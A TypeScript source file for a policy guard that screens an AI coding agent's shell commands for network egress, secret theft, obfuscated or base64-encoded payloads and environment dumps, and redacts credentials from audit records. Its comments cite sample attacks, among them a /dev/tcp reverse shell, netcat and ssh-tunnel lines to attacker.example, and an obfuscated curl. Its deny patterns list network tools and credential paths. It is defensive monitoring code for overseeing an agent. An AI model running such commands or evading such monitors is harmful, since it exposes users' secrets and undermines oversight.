export interface PolicyViolation {
  rule: string;
  detail: string;
  /** Non-allowlisted hosts a human could grant a scoped exception for. */
  hosts?: string[];
}

/**
 * The ONLY rules a human may ever be asked to approve. This is a code-level
 * invariant, not a config value: a non-allowlisted egress can be a legitimate
 * need (a package registry), so it is reviewable — but reading or exfiltrating a
 * protected secret is never something an operator can wave through, no matter
 * what `POLICY_REVIEW_RULES` is set to. Config is intersected with this set and
 * rejected if it names anything outside it (see config.ts).
 */
export const REVIEWABLE_RULES: readonly string[] = ["network-egress-denied"];

/** True only for rules a human is permitted to approve. */
export function isReviewableRule(rule: string): boolean {
  return REVIEWABLE_RULES.includes(rule);
}

export interface PolicyContext {
  allowedHosts: string[];
  /**
   * Literal secret values to mask in recorded evidence. The platform knows its
   * own Ark key, so if an Agent ever inlines it the audit trail must not repeat
   * it back into storage, the API, or the browser.
   */
  secretValues?: string[];
}

// Binaries whose whole purpose is moving bytes. Any use is potential egress.
const ALWAYS_NETWORK =
  /(^|[\s;&|("'`])(curl|wget|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|ftp|socat|openssl|aria2c|httpie|dig|nslookup|host|lwp-request|xh)(\s|$)/i;

// Tools that reach the network only for particular subcommands. Treating all of
// `git` or `npm` as egress would deny `git commit -m "see https://..."`, which
// contacts nothing; matching the subcommand keeps `git push` and
// `npm install --registry` covered without that false positive.
const CONDITIONAL_NETWORK = [
  /(^|[\s;&|("'`])git\s+(?:-\S+\s+)*(push|pull|fetch|clone|remote|submodule|ls-remote)\b/i,
  /(^|[\s;&|("'`])(?:npm|pnpm|yarn|npx)\s+(?:-\S+\s+)*(install|ci|add|publish|update|audit|pack|dlx|exec)\b/i,
  /(^|[\s;&|("'`])pip3?\s+(?:-\S+\s+)*(install|download|wheel)\b/i,
  /(^|[\s;&|("'`])go\s+(get|mod|install)\b/i,
  /(^|[\s;&|("'`])(?:apt|apt-get|brew|gem|cargo|poetry)\s+(?:-\S+\s+)*(install|add|update|upgrade|fetch)\b/i,
];


// Commands that merely write a URL as text: a commit message, an echo into a
// file. These contact nothing and must stay allowed.
//
// Anchored to the *leading* command on purpose. Matching anywhere let
// `$(printf '\x63\x75\x72\x6c') https://attacker.example` exempt itself, where
// printf builds the binary name rather than printing text.
const TEXTUAL_URL_CONTEXT =
  /^\s*(?:\S*sh\s+-\S+\s+)?["']?\s*(echo|printf|git\s+(?:commit|tag))\b/i;

// Any absolute URL, whatever binary (if any) is next to it.
const ANY_URL = /\b[a-z][a-z0-9+.-]*:\/\/[^\s"'`)]+/i;

function usesNetworkTool(command: string): boolean {
  if (ALWAYS_NETWORK.test(command)) return true;
  return CONDITIONAL_NETWORK.some((pattern) => pattern.test(command));
}

// Interpreters can reach the network without naming a network tool.
const INLINE_NETWORK =
  /(python3?\s+-c\b[\s\S]*\b(socket|urllib|requests|httpx|http\.client)\b)|(node\s+-e\b[\s\S]*\b(fetch|https?|net|axios)\b)|(perl\s+-e\b[\s\S]*\b(Socket|LWP)\b)|(\/dev\/(tcp|udp)\/)|(ruby\s+-e\b[\s\S]*\b(Net::HTTP|open-uri|Socket)\b)|(deno\s+(eval|run)\b)|(php\s+-r\b[\s\S]*\b(file_get_contents|curl_|fsockopen)\b)/i;

// Material the Agent has no legitimate reason to read inside a workspace task.
// Matches reading the value, not naming the identifier: `$ARK_API_KEY`,
// `${ARK_API_KEY}`, `process.env.ARK_API_KEY`, `os.environ['ARK_API_KEY']`,
// `$ENV{ARK_API_KEY}`, `getenv("ARK_API_KEY")`, `printenv ARK_API_KEY`.
// Writing prose that mentions the variable is legitimate and must stay allowed.
const ARK_KEY_DEREFERENCE =
  /\$\{?!?ARK_API_KEY\}?|(?:process\.env|os\.environ|ENV)\s*(?:\.\s*ARK_API_KEY|\[\s*['"`]ARK_API_KEY|\{\s*['"`]?ARK_API_KEY)|(?:get|has)env\s*\(\s*['"`]ARK_API_KEY|(?:^|[\s;&|("'`])printenv\s+ARK_API_KEY\b/;

const PROTECTED_SECRETS = [
  { pattern: ARK_KEY_DEREFERENCE, label: "Ark API key environment variable" },
  { pattern: /\.secrets?\b|\.sec\*/, label: "protected .secrets/ directory" },
  { pattern: /customer-db-url/, label: "protected credential fixture" },
  { pattern: /\/proc\/self\/environ/, label: "process environment dump" },
  { pattern: /\bid_rsa\b|\.ssh\/id_/, label: "SSH private key" },
  { pattern: /\.aws\/credentials/, label: "AWS credentials file" },
];

// Weaker signals: legitimate on their own, exfiltration when paired with egress.
// `set` is deliberately excluded — `set -euo pipefail` is ubiquitous in benign
// shell invocations and made this rule fire on ordinary scripted commands.
const ENV_DUMP = /(^|[\s;&|("'`])(printenv|env)(\s|$)/;

// A whole-environment dump to stdout: `printenv` or `env` as a complete command
// segment, with no variable argument and no downstream filter. Matches a bare
// dump or one at the end of a `;`/`&` sequence, but NOT a pipe (`printenv | grep`
// is filtered) nor a var-setting `env FOO=bar cmd` nor `printenv NODE_ENV`.
const FULL_ENV_DUMP = /(^|[\s;&("'`])(printenv|env)\s*($|[;&"'`])/;

// Dotted tokens that are filenames, not hosts. Without this, scanning a command
// for bare hosts would read `index.d.ts` as a domain.
const FILE_EXTENSIONS = new Set([
  "ts", "tsx", "js", "jsx", "mjs", "cjs", "json", "md", "txt", "sh", "bash",
  "zsh", "py", "rb", "go", "rs", "java", "c", "h", "cpp", "hpp", "css", "scss",
  "html", "htm", "xml", "yml", "yaml", "toml", "lock", "gz", "tgz", "zip",
  "tar", "log", "env", "sql", "csv", "png", "jpg", "jpeg", "svg",
  "ico", "pdf", "backup", "bak", "tmp", "map", "d",
  // NB: do not add "example" here — it would mask attacker.example hosts.
]);

// A bare dotted token is treated as a hostname unless it is a filename or a
// code-identifier read (e.g. `process.platform`, `os.arch`). This catches any
// real TLD — including uncommon ones like `.museum` — rather than an allowlist
// that silently misses them. URLs are handled separately and unconditionally.
const CODE_OBJECTS = new Set([
  "process", "os", "path", "fs", "window", "document", "math", "json",
  "console", "module", "exports", "require", "navigator", "location",
  "globalthis", "self", "crypto", "util", "stream", "buffer", "events",
  "child_process", "react", "vue",
]);

function isPlausibleHost(token: string): boolean {
  const lower = token.toLowerCase();
  if (/^\d{1,3}(?:\.\d{1,3}){3}$/.test(lower)) return true; // dotted IPv4
  if (/^\d{7,10}$/.test(lower)) return true; // decimal / integer-form IPv4
  if (looksLikeFilename(lower)) return false;
  const labels = lower.split(".");
  if (labels.length >= 2 && CODE_OBJECTS.has(labels[0]!)) return false;
  const tld = labels.at(-1) ?? "";
  return /^[a-z]{2,24}$/.test(tld); // any alphabetic TLD, not a file extension
}

function looksLikeFilename(token: string): boolean {
  const extension = token.split(".").pop()?.toLowerCase() ?? "";
  return FILE_EXTENSIONS.has(extension);
}

function findProtectedSecret(command: string): string | null {
  for (const secret of PROTECTED_SECRETS) {
    if (secret.pattern.test(command)) return secret.label;
  }
  return null;
}

function extractHosts(command: string): string[] {
  const hosts = new Set<string>();

  // Any scheme, not just http(s): `git push https://...`, `curl -T x ftp://...`,
  // `npm install --registry https://...` all carry the destination in a URL.
  for (const match of command.matchAll(/\b[a-z][a-z0-9+.-]*:\/\/([^/\s"'`)]+)/gi)) {
    const authority = match[1];
    if (authority) {
      // A single trailing dot is the DNS root marker of an FQDN
      // (`attacker.example.` == `attacker.example`), not part of the host.
      hosts.add(authority.replace(/^.*@/, "").split(":")[0]!.toLowerCase().replace(/\.$/, ""));
    }
  }

  // IPv6 literals in brackets, e.g. `curl http://[2001:db8::1]/` or bare
  // `nc [2001:db8::1] 80`. Without this an IPv6 destination is unreadable.
  for (const match of command.matchAll(/\[([0-9a-f]{0,4}(?::[0-9a-f]{0,4}){2,})\]/gi)) {
    const host = match[1];
    if (host) hosts.add(host.toLowerCase());
  }

  // Bash raw sockets, e.g. `bash -i >& /dev/tcp/198.51.100.7/9001 0>&1`. Without
  // this the host is unreadable and a reverse shell that names no secret and no
  // URL falls through every rule.
  for (const match of command.matchAll(/\/dev\/(?:tcp|udp)\/([^/\s"'`)]+)/gi)) {
    const host = match[1];
    if (host) hosts.add(host.toLowerCase());
  }

  // Scan for bare hosts with URLs masked out. A domain appearing inside a URL's
  // path cannot cause egress to itself — the request goes to the authority — so
  // reading one out of a path is a false positive. Authorities were already
  // captured above.
  const withoutUrls = command.replace(/\b[a-z][a-z0-9+.-]*:\/\/[^\s"'`)]+/gi, " URL ");

  // Bare host arguments anywhere in the command, e.g. `nc attacker.example 4444`,
  // `ssh -R 9000:localhost:22 relay.attacker.example`, `openssl -connect h:443`.
  // Scanning only the token after the tool name missed every flagged variant.
  //
  // Host labels may be dotted-OCTAL or dotted-HEX IPv4 (`0306.0063.0144.0007`,
  // `0xc6.0x33.0x64.0x07`) — the same destination in another radix — and an
  // FQDN may carry the DNS-root trailing dot (`attacker.example.`). Both are
  // normalised before the plausibility check; `/` is a valid token boundary
  // (a path on a bare host).
  const DOTTED_OCTAL_IP = /^(0[0-7]{1,3}\.){3}0[0-7]{1,3}$/;
  const DOTTED_HEX_IP = /^(0x[0-9a-fA-F]{1,2}\.){3}0x[0-9a-fA-F]{1,2}$/;
  const normalizeEncodedIpv4 = (token: string): string | null => {
    if (DOTTED_OCTAL_IP.test(token)) {
      return token.split(".").map((label) => String(parseInt(label, 8))).join(".");
    }
    if (DOTTED_HEX_IP.test(token)) {
      return token.split(".").map((label) => String(parseInt(label.slice(2), 16))).join(".");
    }
    return null;
  };

  for (const match of withoutUrls.matchAll(
    /(?:^|[\s;&|(=@:'"`])((?:[a-z0-9-]+\.)+[a-z]{2,}\.?|(?:(?:0[0-7]{1,3}|0x[0-9a-fA-F]{1,2}|\d{1,3})\.){3}(?:0[0-7]{1,3}|0x[0-9a-fA-F]{1,2}|\d{1,3})|\d{7,10})(?=[/\s;&|)'"`:,]|$)/gi,
  )) {
    let token = match[1];
    if (!token) continue;
    const encoded = normalizeEncodedIpv4(token);
    if (encoded) token = encoded;
    if (token.endsWith(".")) token = token.slice(0, -1);
    if (!token || looksLikeFilename(token) || !isPlausibleHost(token)) continue;
    hosts.add(token.toLowerCase());
  }

  return [...hosts];
}

/**
 * ── Encoded-payload decoding ──────────────────────────────────────────────
 *
 * A fully-encoded command (`eval "$(echo <base64> | base64 -d)"`) carries no
 * literal URL, host, tool or secret for the text matcher to see. The only
 * text-visible signal is the DECODER itself plus the encoded blob, so we
 * materialize what the command will decode and re-run the SAME policy on it.
 * A payload that decodes to a violation is a bypass attempt, not a
 * coincidence; a payload that decodes to harmless text stays allowed. No
 * command is ever executed — decoding is pure text.
 */

const MAX_DECODE_DEPTH = 4;

/** A decoder is actually invoked (base64 -d, python b64decode, node Buffer.from). */
const BASE64_DECODER =
  /\bbase64\s+(?:-d|--decode|-D)\b|\bb64decode\s*\(|\.from\([^)]*["']base64["']\)/i;
const XXD_HEX_DECODER = /\bxxd\s+-r\b/i;

const BASE64_BLOB = /[A-Za-z0-9+/]{20,}={0,2}/g;
const HEX_BLOB = /\b[0-9a-fA-F]{20,}\b/g;
const ANSI_C_QUOTE = /\$'([^']*)'/g;
const PRINTF_OCTAL = /printf\s+['"]%b['"]\s+['"]([^'"]*)['"]/g;

function isPrintable(text: string): boolean {
  return text.length > 0 && /^[\x20-\x7e\t\n\r]*$/.test(text);
}

/** Decode a base64 blob, including repeated (double-encoded) layers. */
function decodeBase64Layers(blob: string): string[] {
  const layers: string[] = [];
  let current = blob.replace(/=+$/, "");
  for (let index = 0; index < MAX_DECODE_DEPTH; index += 1) {
    let decoded: string;
    try {
      decoded = Buffer.from(current, "base64").toString("utf8");
    } catch {
      break;
    }
    if (!decoded || decoded.includes("\uFFFD") || !isPrintable(decoded)) break;
    layers.push(decoded);
    // Continue only when the result is itself a plausible base64 blob.
    if (!/^[A-Za-z0-9+/]+={0,2}$/.test(decoded.trim())) break;
    current = decoded.trim();
  }
  return layers;
}

/** Decode bash ANSI-C quoting: \xNN and \NNN octal escapes. */
function decodeAnsiC(body: string): string | null {
  // The /bin/bash -lc "<...>" form Codex emits double-escapes backslashes;
  // collapse them before decoding escapes.
  body = body.replace(/\\\\/g, "\\");
  let out = "";
  for (let index = 0; index < body.length; ) {
    if (body[index] === "\\") {
      const rest = body.slice(index + 1);
      const hex = rest.match(/^x([0-9a-fA-F]{2})/);
      if (hex) {
        out += String.fromCharCode(parseInt(hex[1]!, 16));
        index += 4; // backslash + 'x' + two hex digits
        continue;
      }
      const octal = rest.match(/^([0-7]{1,3})/);
      if (octal) {
        out += String.fromCharCode(parseInt(octal[1]!, 8));
        index += 1 + octal[1]!.length;
        continue;
      }
      out += rest[0] ?? "";
      index += 2;
      continue;
    }
    out += body[index]!;
    index += 1;
  }
  return isPrintable(out) ? out : null;
}

/** Decode `printf '%b' '\NNN...'` octal escapes. */
function decodeOctalEscapes(body: string): string | null {
  // Collapse double-escaped backslashes from the wrapped /bin/bash -lc form.
  body = body.replace(/\\\\/g, "\\");
  let out = "";
  for (let index = 0; index < body.length; ) {
    if (body[index] === "\\") {
      const octal = body.slice(index + 1).match(/^([0-7]{1,3})/);
      if (octal) {
        out += String.fromCharCode(parseInt(octal[1]!, 8));
        index += 1 + octal[1]!.length;
        continue;
      }
      out += body[index + 1] ?? "";
      index += 2;
      continue;
    }
    out += body[index]!;
    index += 1;
  }
  return isPrintable(out) ? out : null;
}

/** Payloads the command itself would materialize via a decoder it invokes. */
function decodedPayloads(command: string): string[] {
  const payloads: string[] = [];
  if (BASE64_DECODER.test(command)) {
    for (const match of command.matchAll(BASE64_BLOB)) {
      payloads.push(...decodeBase64Layers(match[0]!));
    }
  }
  if (XXD_HEX_DECODER.test(command)) {
    for (const match of command.matchAll(HEX_BLOB)) {
      try {
        const decoded = Buffer.from(match[0]!, "hex").toString("utf8");
        if (isPrintable(decoded)) payloads.push(decoded);
      } catch {
        /* not hex */
      }
    }
  }
  for (const match of command.matchAll(ANSI_C_QUOTE)) {
    const decoded = decodeAnsiC(match[1]!);
    if (decoded) payloads.push(decoded);
  }
  for (const match of command.matchAll(PRINTF_OCTAL)) {
    const decoded = decodeOctalEscapes(match[1]!);
    if (decoded) payloads.push(decoded);
  }
  return payloads;
}

export function evaluateCommand(
  command: string,
  context: PolicyContext,
  depth = 0,
): PolicyViolation | null {
  if (!command.trim()) return null;

  // Encoded payloads: run the decoded text through the SAME policy. If the
  // command's own decoder materializes a denied payload, the command is a
  // bypass attempt. Depth-limited so encoded chains cannot recurse forever.
  if (depth < MAX_DECODE_DEPTH) {
    for (const payload of decodedPayloads(command)) {
      const inner = evaluateCommand(payload, context, depth + 1);
      if (inner) {
        return {
          rule: "encoded-exfiltration",
          detail: "Command decodes to a denied payload: " + inner.detail,
        };
      }
    }
  }

  const allowed = new Set(context.allowedHosts.map((host) => host.toLowerCase()));
  const usesNetwork = usesNetworkTool(command) || INLINE_NETWORK.test(command);
  const secret = findProtectedSecret(command);
  const dumpsEnvironment = ENV_DUMP.test(command);

  if (usesNetwork && (secret || dumpsEnvironment)) {
    return {
      rule: "secret-exfiltration",
      detail:
        "Command combines network egress with access to " +
        (secret ?? "the process environment") +
        ".",
    };
  }

  const disallowed = extractHosts(command).filter((host) => !allowed.has(host));

  if (usesNetwork && disallowed.length > 0) {
    return {
      rule: "network-egress-denied",
      detail:
        "Command contacts non-allowlisted host(s): " + disallowed.join(", ") + ".",
      hosts: disallowed,
    };
  }

  // No recognised network tool, but a non-allowlisted destination is present.
  // This is what catches obfuscated tool names (`c""url`, `$X`, `$'\x63url'`,
  // base64-decoded commands): the binary can be hidden, the destination cannot.
  if (!usesNetwork && disallowed.length > 0 && ANY_URL.test(command)) {
    if (!TEXTUAL_URL_CONTEXT.test(command)) {
      return {
        rule: "network-egress-denied",
        detail:
          "Command references non-allowlisted host(s) without a recognised " +
          "network tool, which is how an obfuscated command hides its binary: " +
          disallowed.join(", ") + ".",
        hosts: disallowed,
      };
    }
  }

  if (secret) {
    return {
      rule: "protected-secret-access",
      detail: "Command reads " + secret + ".",
    };
  }

  // A bare, unfiltered environment dump reveals ARK_API_KEY into the command
  // output — which the model reads and may echo — even without egress. A
  // filtered dump (`printenv | grep X`) or a var-setting `env FOO=bar cmd` or a
  // single-var read (`printenv NODE_ENV`) is fine; only a whole-environment dump
  // to stdout is denied.
  if (FULL_ENV_DUMP.test(command)) {
    return {
      rule: "protected-secret-access",
      detail: "Command dumps the full process environment, exposing secrets.",
    };
  }

  return null;
}

export function allowedHostsFrom(arkBaseUrl: string): string[] {
  try {
    return [new URL(arkBaseUrl).hostname.toLowerCase()];
  } catch {
    return [];
  }
}


const REDACTED = "***REDACTED***";

// Credentials embedded in a URL authority, e.g. postgres://user:pw@host.
const URL_CREDENTIALS = /(\b[a-z][a-z0-9+.-]*:\/\/[^\s:/@"']+:)[^\s@"']+(@)/gi;

// Long opaque strings: API keys, tokens, base64 blobs. Deliberately conservative
// so ordinary arguments, paths and hashes-in-filenames are left readable.
const HIGH_ENTROPY = /\b(?=[A-Za-z0-9_+/=-]{28,})(?=[^\s]*[A-Za-z])(?=[^\s]*\d)[A-Za-z0-9_+/=-]{28,}\b/g;

/**
 * Removes secret material from a command before it is recorded as evidence.
 *
 * A policy decision is stored, served over the API and rendered in the browser.
 * Without this, a command that inlined a resolved credential would leak it
 * through the very audit trail meant to protect it. Redaction is applied where
 * the violation is constructed, so the raw text never leaves the Runtime.
 */
export function redactCommand(command: string, secretValues: readonly string[] = []): string {
  let redacted = command;
  for (const secret of secretValues) {
    // Only mask values substantial enough to be a real credential; masking a
    // short or empty value would blank out unrelated text.
    if (secret && secret.length >= 8) {
      redacted = redacted.split(secret).join(REDACTED);
    }
  }
  redacted = redacted.replace(URL_CREDENTIALS, "$1" + REDACTED + "$2");
  redacted = redacted.replace(HIGH_ENTROPY, REDACTED);
  return redacted;
}

export interface DetectedViolation extends PolicyViolation {
  command: string;
}

/**
 * Evaluates one command, failing closed: if evaluation throws, the command is
 * denied, not allowed. A safety control that crashes must not become a bypass.
 * `evaluate` is injectable so the fail-closed path is testable.
 */
export function guardedEvaluate(
  command: string,
  context: PolicyContext,
  evaluate: (command: string, context: PolicyContext) => PolicyViolation | null = evaluateCommand,
): PolicyViolation | null {
  try {
    return evaluate(command, context);
  } catch {
    return {
      rule: "policy-error",
      detail: "Policy evaluation failed; failing closed and denying the command.",
    };
  }
}

/**
 * Evaluates commands observed since `startIndex` and returns EVERY denial in
 * order — not just the first. Returning all of them keeps monitor-mode evidence
 * complete when one streamed batch contains several violating commands.
 *
 * Both runners stream Codex events and need identical policy behaviour, so the
 * scan lives here rather than being duplicated per runner.
 */
export function scanCommands(
  commands: readonly string[],
  startIndex: number,
  context: PolicyContext,
): DetectedViolation[] {
  const found: DetectedViolation[] = [];
  for (let index = startIndex; index < commands.length; index += 1) {
    const command = commands[index];
    if (!command) continue;
    const violation = guardedEvaluate(command, context);
    if (violation) {
      found.push({ ...violation, command: redactCommand(command, context.secretValues) });
    }
  }
  return found;
}

/** Ark's own host is always reachable; operators may allow more via config. */
// Loopback is the container talking to itself (a local dev server the Agent
// spun up to test), not an exfiltration channel — the host-side collector lives
// on host.docker.internal, which is NOT loopback. Allowed by default and
// consistently, so `curl localhost:3000` and `curl http://localhost/health`
// behave the same. Obfuscated forms (decimal/IPv6 that happen to encode
// loopback) are still denied — no legitimate task writes `curl 2130706433`.
const LOOPBACK_HOSTS = ["localhost", "127.0.0.1", "::1"];

export function policyContextFrom(
  arkBaseUrl: string,
  extraHosts: readonly string[] = [],
  secretValues: readonly string[] = [],
): PolicyContext {
  return {
    allowedHosts: [...allowedHostsFrom(arkBaseUrl), ...LOOPBACK_HOSTS, ...extraHosts],
    secretValues: [...secretValues],
  };
}
